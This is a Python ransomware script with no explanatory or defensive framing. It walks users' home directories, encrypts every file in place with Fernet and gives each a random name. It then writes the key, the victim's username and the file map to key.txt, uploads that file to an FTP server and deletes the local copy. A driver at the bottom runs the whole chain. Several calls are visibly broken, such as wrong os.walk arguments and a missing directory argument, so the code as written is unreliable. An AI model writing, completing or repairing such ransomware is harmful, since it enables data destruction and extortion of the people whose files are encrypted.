import os
import random
import string
import ftplib
import platform
import subprocess
from cryptography.fernet import Fernet, InvalidToken


class Ransomware:
    def __init__(self, 
                 files=[], 
                 directories=[], 
                 files_dict={},
                 get_name = "",
                 key_dir="",
                 key=Fernet.generate_key()
                 ) -> None:

        system_name = platform.system()
        if system_name == "Windows":
            get_name = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
            directory = "C:/"
        elif system_name == "Darwin":
            get_name = "whoami"
            directory = "/Users"
        elif system_name == "Linux":
            get_name = "whoami"
            directory = "/home"
        else:
            get_name = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
            directory = "C:/"

        name = subprocess.run(get_name, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).decode("utf-8")
        
        self.key = key
        self.name = name
        self.files = files
        self.key_dir = key_dir
        self.files_dict = files_dict
        self.directories = directories
        

        keytxt = f"""
Key:   {self.key}\n
Name:  {self.name}\n
Files: {self.files}\n
Dict:  {self.files_dict}
""" 
        self.keytxt = keytxt

        os.chdir(directory)

    def id_generator(self, 
                     size, 
                     chars=string.ascii_lowercase + string.digits
                    ) -> str:
                        
        return ''.join(random.choice(chars) for _ in range(size))


    def files_dir(self, directory) -> None:
        system_dirs = ["Windows", "Program Files", "Program Files (x86)", "System Volume Information", "Boot", "Recovery"]

        for root, dirs, files in os.walk(self, directory):
            # Skip system directories
            if any(system_dir in root for system_dir in system_dirs):
                continue

            for file in files:
                if file == "ransom.py":
                    continue  # Do not encrypt the current file we are working with or the key

                self.files.append(os.path.join(root, file))

            for dir in dirs:
                self.files_dir(os.path.join(root, dir))

    def encrypt_loop(self) -> None:
        for file in self.files:
            with open(file, "rb") as the_file:
                contents = the_file.read()

            cipher_suite = Fernet(self.key)
            contents_encrypted = cipher_suite.encrypt(contents)

            with open(file, "wb") as the_file:
                the_file.write(contents_encrypted)
            
            # Verification step
            with open(file, "rb") as the_file:
                contents_encrypted = the_file.read()
        
            try:
                contents_decrypted = cipher_suite.decrypt(contents_encrypted)
                if contents == contents_decrypted:
                    print(f"File {file} was successfully encrypted and verified.")
                else:
                    print(f"File {file} encryption verification failed.")

            except InvalidToken:
                print(f"Could not decrypt file: {file}")
            
            except IOError:
                print(f"Could not read file: {file}. Skipping...")
                continue

    def rename_files(self) -> None:
        for _ in self.files:
            if _ == '.DS_Store':
                continue

            name = self.id_generator(random.randint(16, 21))
            ext = "." + self.id_generator(random.randint(7, 10))

            last = f"{name}{ext}"

            self.files_dict.update({last: _})

            os.rename(_, last)

    def files_write(self) -> None:
        self.key_dir = f"{os.getcwd()}" + "/key.txt"
        with open(self.key_dir, "wb") as key_file:
            key_file.write(self.keytxt)

    def send_file_to_ftp(self, 
                         server="", 
                         username="", 
                         password="", 
                         file_path="") -> bytes:
        
        file_path = self.key_dir
        
        ftp = ftplib.FTP(server)
        ftp.login(user=username, passwd=password)
        
        try:
            with open(file_path, 'rb') as file:
                ftp.storbinary(f'STOR {file_path}', file)
        except ftplib.error_perm:
            print("Error: Check your file path")
            return None
        ftp.quit()

        # assure to encrypt key file
        encrypted = Fernet.encrypt(self.key)
        with open(file_path, 'wb') as file:
            file.write(encrypted)
        os.remove(file_path)

starter = Ransomware()
starter.files_dir()
starter.encrypt_loop()
starter.rename_files()
starter.files_write()
starter.send_file_to_ftp()
